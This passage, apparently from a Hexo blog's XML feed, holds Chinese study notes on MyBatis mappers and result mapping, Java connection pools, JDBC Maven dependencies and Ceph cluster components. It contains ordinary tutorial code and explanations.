class="hljs-variable">@Update</span>(<span class="hljs-string">&quot;update t_car set car_num=<span class="hljs-subst">#&#123;carNum&#125;</span>,brand=<span class="hljs-subst">#&#123;brand&#125;</span>,guide_price=<span class="hljs-subst">#&#123;guidePrice&#125;</span> where id = <span class="hljs-subst">#&#123;id&#125;</span>&quot;</span>)<br>    int update(<span class="hljs-title class_">Car</span> car);<br>    <br>&#125;<br></code></pre></td></tr></table></figure><hr><h4 id="5-4-查询-SQL"><a href="#5-4-查询-SQL" class="headerlink" title="5.4. 查询 SQL"></a>5.4. 查询 SQL</h4><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-variable">@Mapper</span><br>public interface CarMapper &#123;<br><br>    <span class="hljs-variable">@Select</span>(<span class="hljs-string">&quot;select * from t_car where id = #&#123;id&#125;&quot;</span>)<br><span class="hljs-variable">@Results</span>(&#123;<br><span class="hljs-variable">@Result</span>(column = <span class="hljs-string">&quot;id&quot;</span>, property = <span class="hljs-string">&quot;id&quot;</span>, id = true),<br><span class="hljs-variable">@Result</span>(column = <span class="hljs-string">&quot;car_num&quot;</span>, property = <span class="hljs-string">&quot;carNum&quot;</span>),<br><span class="hljs-variable">@Result</span>(column = <span class="hljs-string">&quot;brand&quot;</span>, property = <span class="hljs-string">&quot;brand&quot;</span>),<br>&#125;)<br>User <span class="hljs-built_in">selectUserWithCustomMapping</span>(int id);<br>&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="6-常用连接池"><a href="#6-常用连接池" class="headerlink" title="6. 常用连接池"></a>6. 常用连接池</h3><p>Spring Boot MyBatis 默认使用 HikariCP 作为连接池，因为其性能最高，关于连接池的配置我们都能在其 README 或文档中找到：</p><ol><li>Druid：<a href="https://github.com/alibaba/druid/wiki/DruidDataSource%E9%85%8D%E7%BD%AE%E5%B1%9E%E6%80%A7%E5%88%97%E8%A1%A8">Druid 官方文档</a> </li><li>HikariCP：<a href="https://github.com/brettwooldridge/HikariCP?tab=readme-ov-file">HikariCP 官方文档</a></li><li>C3P0：<a href="https://github.com/swaldman/c3p0">C3P0 官方文档</a></li><li>Spring Boot 配置连接池：<a href="https://docs.spring.io/spring-boot/appendix/application-properties/index.html#appendix.application-properties.actuator">Spring Boot 中配置连接池的属性</a></li></ol><hr><h3 id="7-List-Pojo-如何处理"><a href="#7-List-Pojo-如何处理" class="headerlink" title="7. List Pojo 如何处理"></a>7. List Pojo 如何处理</h3><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-meta">@Service</span>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceImpl</span> <span class="hljs-title">implements</span> <span class="hljs-title">UserService</span> &#123;  <br>  <br>    <span class="hljs-meta">@Autowired</span>  <br>    <span class="hljs-keyword">private</span> UserMapper userMapper;  <br>  <br>  <br>    <span class="hljs-meta">@Override</span>  <br>    <span class="hljs-keyword">public</span> List&lt;User&gt; getUserById(int id) &#123;  <br>        List&lt;User&gt; users = userMapper.getUserById(id);  <br>  <br>        <span class="hljs-comment">// 终端遍历输出查询到的数据  </span><br>        <span class="hljs-keyword">for</span> (User user : users) &#123;  <br>            System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;User ID: &quot;</span> + user.getId()  <br>                    + <span class="hljs-string">&quot;, FirstNmae: &quot;</span> + user.getFirstName()  <br>                    + <span class="hljs-string">&quot;, LastName: &quot;</span> + user.getLastName());  <br>        &#125;  <br>  <br>        <span class="hljs-keyword">return</span> users;  <br>    &#125;  <br>  <br>    <span class="hljs-meta">@Override</span>  <br>    <span class="hljs-keyword">public</span> List&lt;User&gt; getAllUsers() &#123;  <br>        List&lt;User&gt; users = userMapper.getAllUsers();  <br>  <br>        <span class="hljs-comment">// 终端遍历输出查询到的数据  </span><br>        <span class="hljs-keyword">for</span> (User user : users) &#123;  <br>            System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;User ID: &quot;</span> + user.getId()  <br>                    + <span class="hljs-string">&quot;, FirstNmae: &quot;</span> + user.getFirstName()  <br>                    + <span class="hljs-string">&quot;, LastName: &quot;</span> + user.getLastName());  <br>        &#125;  <br>  <br>        <span class="hljs-keyword">return</span> users;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="8-List-如何处理"><a href="#8-List-如何处理" class="headerlink" title="8. List &lt;Map&lt;String,Object&gt;&gt; 如何处理"></a>8. List &lt;Map&lt;String,Object&gt;&gt; 如何处理</h3><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-meta">@Service</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserService</span> &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-title class_">UserMapper</span> userMapper;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">Object</span>&gt;&gt; <span class="hljs-title function_">getUserById</span>(<span class="hljs-params">int id</span>) &#123;<br>        <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">Object</span>&gt;&gt; users = userMapper.<span class="hljs-title function_">getUserById</span>(id);<br><br>        <span class="hljs-comment">// 终端遍历输出查询到的数据</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">Object</span>&gt; user : users) &#123;<br>            <span class="hljs-comment">// 根据列名获取值</span><br>            <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">&quot;User ID: &quot;</span> + user.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;id&quot;</span>) <br>                    + <span class="hljs-string">&quot;, FirstName: &quot;</span> + user.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;first_name&quot;</span>) <br>                    + <span class="hljs-string">&quot;, LastName: &quot;</span> + user.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;last_name&quot;</span>));<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> users;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">Object</span>&gt;&gt; <span class="hljs-title function_">getAllUsers</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">Object</span>&gt;&gt; users = userMapper.<span class="hljs-title function_">getAllUsers</span>();<br><br>        <span class="hljs-comment">// 终端遍历输出查询到的数据</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">Object</span>&gt; user : users) &#123;<br>            <span class="hljs-comment">// 根据列名获取值</span><br>            <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">&quot;User ID: &quot;</span> + user.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;id&quot;</span>)<br>                    + <span class="hljs-string">&quot;, FirstName: &quot;</span> + user.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;first_name&quot;</span>) <br>                    + <span class="hljs-string">&quot;, LastName: &quot;</span> + user.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;last_name&quot;</span>));<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> users;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="有意思"><a href="#有意思" class="headerlink" title="有意思"></a>有意思</h1><p>之所以 <code>UsersMapper</code> 能“开箱即用”而你的 <code>AuditsCyfhMapper</code> 会拿不到 Bean，关键就在于接口方法签名和 XML 配置完全对上了：</p><ol><li><p><strong>方法参数与 <code>parameterType</code> 一致</strong></p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 接口</span><br>Users <span class="hljs-title function_">findUserWithAuthoritieByUserName</span><span class="hljs-params">(String username)</span>;<br></code></pre></td></tr></table></figure> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- XML --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;findUserWithAuthoritieByUserName&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;string&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;BaseResultMap&quot;</span>&gt;</span><br>  …<br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><p> 这里接口只要一个 <code>String</code> 参数，XML 里也声明 <code>parameterType=&quot;string&quot;</code>，MyBatis 就能顺利为该方法生成代理，Spring 也就能把它当 Bean 注入。</p></li><li><p><strong>返回值和 <code>resultMap</code> 匹配</strong><br> 接口返回的是单一的 <code>Users</code> 对象，XML 用 <code>&lt;resultMap&gt;</code> 把查询列一一映射到 <code>Users</code> 的属性上，流程一气呵成。</p></li></ol><hr><h3 id="对比你的-AuditsCyfhMapper"><a href="#对比你的-AuditsCyfhMapper" class="headerlink" title="对比你的 AuditsCyfhMapper"></a>对比你的 <code>AuditsCyfhMapper</code></h3><ul><li><p><strong>接口却写成了</strong></p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Integer <span class="hljs-title function_">insertAuditsCyfh</span><span class="hljs-params">(<span class="hljs-type">int</span> userId, String title, String content)</span>;<br></code></pre></td></tr></table></figure></li><li><p><strong>XML 却声明</strong></p>  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">insert</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;insertAuditsCyfh&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;com.example.db.entity.AuditsCyfh&quot;</span>&gt;</span><br>   …<br><span class="hljs-tag">&lt;/<span class="hljs-name">insert</span>&gt;</span><br></code></pre></td></tr></table></figure><p>  这样 MyBatis 就找不到签名匹配的映射——它在 XML 里看不到三个独立参数应该怎么装配到 <code>AuditsCyfh</code> 对象上，所以根本不会为 <code>insertAuditsCyfh(int,String,String)</code> 生成代理，Spring 在启动时也就没法注入 <code>auditsCyfhMapper</code>，导致它在 Controller 里一直是 <code>null</code>。</p></li></ul><hr><h4 id="如何让两者“同样没事”？"><a href="#如何让两者“同样没事”？" class="headerlink" title="如何让两者“同样没事”？"></a>如何让两者“同样没事”？</h4><p>你要么</p><ol><li><p><strong>统一成「传实体」的方式</strong></p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 接口</span><br>Integer <span class="hljs-title function_">insertAuditsCyfh</span><span class="hljs-params">(AuditsCyfh record)</span>;<br></code></pre></td></tr></table></figure> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- XML --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">insert</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;insertAuditsCyfh&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;com.example.db.entity.AuditsCyfh&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">useGeneratedKeys</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">keyProperty</span>=<span class="hljs-string">&quot;articleId&quot;</span>&gt;</span><br>  INSERT INTO Audits_cyfh (user_id,title,content)<br>  VALUES (#&#123;userId&#125;,#&#123;title&#125;,#&#123;content&#125;)<br><span class="hljs-tag">&lt;/<span class="hljs-name">insert</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ol><p>要么<br>2. <strong>改成「独立参数 + map」的方式</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 接口</span><br>Integer <span class="hljs-title function_">insertAuditsCyfh</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;userId&quot;)</span> <span class="hljs-type">int</span> userId,</span><br><span class="hljs-params">                         <span class="hljs-meta">@Param(&quot;title&quot;)</span>  String title,</span><br><span class="hljs-params">                         <span class="hljs-meta">@Param(&quot;content&quot;)</span>String content)</span>;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- XML --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">insert</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;insertAuditsCyfh&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;map&quot;</span> <span class="hljs-attr">useGeneratedKeys</span>=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-attr">keyProperty</span>=<span class="hljs-string">&quot;articleId&quot;</span>&gt;</span><br>  INSERT INTO Audits_cyfh (user_id,title,content)<br>  VALUES (#&#123;userId&#125;,#&#123;title&#125;,#&#123;content&#125;)<br><span class="hljs-tag">&lt;/<span class="hljs-name">insert</span>&gt;</span><br></code></pre></td></tr></table></figure><p>把签名和 <code>parameterType</code> 对齐之后，MyBatis 就能给 <code>AuditsCyfhMapper</code> 生成代理，Spring 也能正常注入，你就不会再拿到 <code>null</code> 了。<br><img src="/2025/05/12/%E6%9C%AA%E5%91%BD%E5%90%8D/pring%20Data%20MyBatis/image-20250617163656683.png"></p><p>因为其实Controller 的返回值是返回给客户端的，我门随意返回都无所谓，但是在 Mapper 接口中，我们的返回值必须好好的整一整，因为我们执行 SQL 语句他返回的值肯定是固定的</p><p>然后 Mapper 传入的参数也需要好好搞一搞，因为是需要传入我们 SQL 与的</p><h1 id="很有意思"><a href="#很有意思" class="headerlink" title="很有意思"></a>很有意思</h1><p>我们平常都是select all 对吧，就是不管我们知道是根据 ID 只查一条也是selec all 因为你懒得取搞那么多烦人的事情，但是我们一般也会用到一条的时候，例如这种情况对吧，然后我们就可以使用实体类，然后get（0）就算是获取他的第一条了，但是这个也很有问题，就是你查全区get0，如果这个id有还好，让你查到了，没查到也罢，会给你提示，但是如果你是直接查全文，那么如果已经没有3了，就会拿到4，就和你想的不一样<br><img src="/2025/05/12/%E6%9C%AA%E5%91%BD%E5%90%8D/pring%20Data%20MyBatis/image-20250617175958685.png"></p><p><img src="/2025/05/12/%E6%9C%AA%E5%91%BD%E5%90%8D/pring%20Data%20MyBatis/image-20250617175835700.png"></p>]]></content>
    
    
    <categories>
      
      <category>数据管理</category>
      
      <category>关系型数据库</category>
      
      <category>MySQL</category>
      
      <category>Spring Data MyBatis</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：JDBC 规范</title>
    <link href="/2025/04/10/%E7%AC%94%E8%AE%B0%EF%BC%9AJDBC%20%E8%A7%84%E8%8C%83/"/>
    <url>/2025/04/10/%E7%AC%94%E8%AE%B0%EF%BC%9AJDBC%20%E8%A7%84%E8%8C%83/</url>
    
    <content type="html"><![CDATA[<h1 id="一、理论"><a href="#一、理论" class="headerlink" title="一、理论"></a>一、理论</h1><h3 id="1-导图：Map：JDBC"><a href="#1-导图：Map：JDBC" class="headerlink" title="1. 导图：Map：JDBC"></a>1. 导图：<a href="Map%EF%BC%9AJDBC.xmind">Map：JDBC</a></h3><hr><h3 id="2-JDBC-概述"><a href="#2-JDBC-概述" class="headerlink" title="2. JDBC 概述"></a>2. JDBC 概述</h3><p>JDBC（Java Database Connectivity）是一组统一的接口，允许 Java 应用程序通过调用这些接口与不同的数据库进行交互。简而言之，Java 调用 JDBC 接口，接口再执行 SQL 语句，从而实现与多种数据库的通信。</p><hr><h1 id="二、实操"><a href="#二、实操" class="headerlink" title="二、实操"></a>二、实操</h1><h3 id="1-引入相关依赖"><a href="#1-引入相关依赖" class="headerlink" title="1. 引入相关依赖"></a>1. 引入相关依赖</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 1.MySQL JDBC 驱动依赖（数据库驱动依赖），使用那个数据库就添加那个数据库的驱动依赖 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.0.33<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span> <br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- 2.Druid 连接池 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>druid<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.15<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><hr>]]></content>
    
    
    <categories>
      
      <category>数据管理</category>
      
      <category>关系型数据库</category>
      
      <category>JDBC 规范</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：Ceph 基础</title>
    <link href="/2025/04/08/%E7%AC%94%E8%AE%B0%EF%BC%9ACeph%20%E5%9F%BA%E7%A1%80/"/>
    <url>/2025/04/08/%E7%AC%94%E8%AE%B0%EF%BC%9ACeph%20%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h3 id="Geph-组件"><a href="#Geph-组件" class="headerlink" title="Geph 组件"></a>Geph 组件</h3><ol><li>&#x3D;&#x3D;Monitors（监管）&#x3D;&#x3D;：<ol><li>Monitor负责监控集群状态并保持集群的一致性，确保每个节点（例如 OSD 或 MDS）都正常工作，如果出现问题，它会警告Managers，并协助修复。</li><li>它们维护一个关于整个集群的状态数据，保存关于集群配置、节点状态等信息。</li><li><ul><li>Monitor 保存集群的状态信息（如各 OSD 节点、PG（Placement Group）和 CRUSH map 等），并确保集群的一致性。</li></ul></li><li>Ceph Monitor (守护进程 ceph-mon) 维护集群状态的映射，包括监视器映射、管理器映射、OSD 映射、MDS 映射和 CRUSH 映射。这些映射是 Ceph 守护进程相互协调所需的关键集群状态。监视器还负责管理守护进程和客户端之间的身份验证。通常至少需要三个监视器才能实现冗余和高可用性。基于 paxos 协议实现节点间的信息同步。</li></ol></li><li>&#x3D;&#x3D;Managers（管理）&#x3D;&#x3D;：<ol><li><strong>Manager</strong>（简称 MGR）是 Ceph 集群中的管理组件，提供集群的<strong>管理、监控、统计和配置功能</strong>。</li><li>它们监控集群的性能、资源利用情况，并且管理集群的一些高级功能，比如扩展、修复和优化。</li><li>通过 <strong>Manager</strong>，管理员可以查看集群的健康状态，并作出调整，甚至可以通过 <strong>Web 界面</strong>进行集群管理。</li><li>Ceph 管理器 (守护进程 ceph-mgr) 负责跟踪运行时指标和 Ceph 集群的当前状态，包括存储利用率、当前性能指标和系统负载。Ceph 管理器守护进程还托管基于 Python 的模块来管理和公开 Ceph 集群信息，包括基于 Web 的 Ceph 仪表板和 REST API。高可用性通常至少需要两个管理器。基于 raft 协议实现节点间的信息同步。</li></ol></li><li>&#x3D;&#x3D;OSDs（存储工人）&#x3D;&#x3D;：<ol><li>是负责宿主机上实际的数据存储和管理，其主要任务是存储数据对象并处理对这些数据对象的读写操作。</li><li>还负责数据的副本管理、数据恢复、数据重新平衡等工作。</li><li><ul><li><strong>OSD</strong>（Object Storage Daemon）是 Ceph 存储的核心组件，负责数据的<strong>存储、读取、复制和恢复</strong>。</li></ul></li></ol><ul><li>每个 OSD 进程管理一个磁盘（或磁盘的某一部分），并且会维护数据的副本，确保数据的冗余性和可靠性。</li><li>当某个 OSD 发生故障时，其他 OSD 会自动修复数据的丢失，保持数据的高可用性。</li><li>Ceph OSD (对象存储守护进程，ceph-osd) 存储数据，处理数据复制、恢复、重新平衡，并通过检查其他 Ceph OSD 守护进程的心跳来向 Ceph 监视器和管理器提供一些监控信息。通常至少需要 3 个 Ceph OSD 来实现冗余和高可用性。本质上 osd 就是一个个 host 主机上的存储磁盘。</li></ul></li><li>&#x3D;&#x3D;MDSs（文件管理员）&#x3D;&#x3D;<ol><li><strong>MDS</strong> 是 Ceph 文件系统（CephFS）的核心组件，负责存储和管理<strong>文件系统的元数据</strong>（如文件和目录的结构、权限等）。</li><li>它确保 CephFS 文件系统的路径、文件名、目录结构和权限等信息的快速访问。</li><li>每个 MDS 处理 CephFS 中的一部分元数据。多个 MDS 可以共同工作，来提高文件系统的性能。</li><li>如果你把 Ceph 看作一个超级大文件系统，<strong>MDS</strong> 就像是<strong>文件管理员</strong>，负责管理文件目录的“标签”和“标签夹”，确保你能快速找到需要的文件并操作它们。</li><li>Ceph 元数据服务器（MDS [Metadata Server]、ceph-mds）代表 Ceph 文件系统存储元数据。Ceph 元数据服务器允许 POSIX（为应用程序提供的接口标准）文件系统用户执行基本命令（如 ls、find 等），而不会给 Ceph 存储集群带来巨大负担。</li></ol></li><li>&#x3D;&#x3D;PGs（数据分组）&#x3D;&#x3D;<ol><li><strong>PG</strong>（Placement Group）是 Ceph 中用于数据分布的基本单位。它们将存储数据的对象划分成多个组，每个 PG 包含多个数据对象</li><li>每个 PG 会将数据分布到多个 OSD 上，这样可以提高存储的效率和容错性。</li><li>PG 负责决定每个数据对象存储在哪些 OSD 上，并处理这些对象的副本。</li><li>你可以把 PG 想象成 <strong>Ceph 中的数据分类箱</strong>。每个数据对象会被分配到一个或多个 PG 里面，然后这些 PG 会负责把数据分发到不同的 OSD 上。这样，数据既能高效存储，又能确保在故障时不丢失。</li><li>简单来说，一个 PG 包含多个 OSD</li><li>PG 全称 Placement Groups，是一个逻辑的概念，一个 PG 包含多个 OSD。引入 PG 这一层其实是为了更好的分配数据和定位数据。写数据的时候，写入主 osd，冗余两份。</li><li>PG 会对数据自动进行备份？</li></ol></li></ol><h3 id="数据存储流程"><a href="#数据存储流程" class="headerlink" title="数据存储流程"></a>数据存储流程</h3><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9ACeph%20%E5%9F%BA%E7%A1%80/image-20250409101551563.png"></p><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9ACeph%20%E5%9F%BA%E7%A1%80/image-20250409101918985.png"></p><h3 id="Ceph-数据冗余机制"><a href="#Ceph-数据冗余机制" class="headerlink" title="Ceph 数据冗余机制"></a>Ceph 数据冗余机制</h3><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9ACeph%20%E5%9F%BA%E7%A1%80/image-20250409101837245.png"><br>PG 下的 OSD 也会选主，主要是为了磁盘之间的数据一致性同步和像 mon 报告自身状态，使用的是 Hash 算法将数据 object 对象到 PG，将 PG里面的数据分散到不同的OSD</p><h4 id="Ceph-存储类型"><a href="#Ceph-存储类型" class="headerlink" title="Ceph 存储类型"></a>Ceph 存储类型</h4><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9ACeph%20%E5%9F%BA%E7%A1%80/image-20250409102406023.png"></p><h3 id="Ceph-存储原理"><a href="#Ceph-存储原理" class="headerlink" title="Ceph 存储原理"></a>Ceph 存储原理</h3><h3 id="ceph-版本选择"><a href="#ceph-版本选择" class="headerlink" title="ceph 版本选择"></a>ceph 版本选择</h3><p>cpeh 只有三种版本：x.0.z是开发版，x.1.z是候选版，x.2.z（稳定、修正版）</p><h3 id="Ceph-实战"><a href="#Ceph-实战" class="headerlink" title="Ceph 实战"></a>Ceph 实战</h3><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>在Ceph系统的搭建过程中，会出现各种意想不到或者预想到问题，其主要原因就是由于 ceph 快速更新和 底层操作系统的库文件、内核、gcc 版本之间的兼容性之间的问题，其实对 Ubuntu 的兼容性还号就算整个过程中每一步都没问题，还是会出现各<br>种问题，这些问题不仅仅在网上找不到，甚至在官网中找不到，甚至玩ceph数年的人都解决不了。</p><p>尤其是，就算你第一次成功后，第二次重试就会出现问题。所以，如果出现问题怎么办？一步一步踏踏实实的进行<br>研究，分析解决问题，并进行总结并梳理成册就可以了。</p><p>ceph的环境部署是非常繁琐的，所以，官方帮我们提供了很多的快捷部署方式。<br><a href="https://docs.ceph.com/en/pacific/install/">https://docs.ceph.com/en/pacific/install/</a></p><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9ACeph%20%E5%9F%BA%E7%A1%80/image-20250409110737249.png"></p><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9ACeph%20%E5%9F%BA%E7%A1%80/image-20250409110924759.png"></p>]]></content>
    
    
    <categories>
      
      <category>数据管理</category>
      
      <category>数据的组织方式</category>
      
      <category>统一存储</category>
      
      <category>Ceph</category>
      
      <category>Ceph 基础</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：MySQL 基础</title>
    <link href="/2025/04/06/%E7%AC%94%E8%AE%B0%EF%BC%9AMySQL%20%E5%9F%BA%E7%A1%80/"/>
    <url>/2025/04/06/%E7%AC%94%E8%AE%B0%EF%BC%9AMySQL%20%E5%9F%BA%E7%A1%80/</url>
    
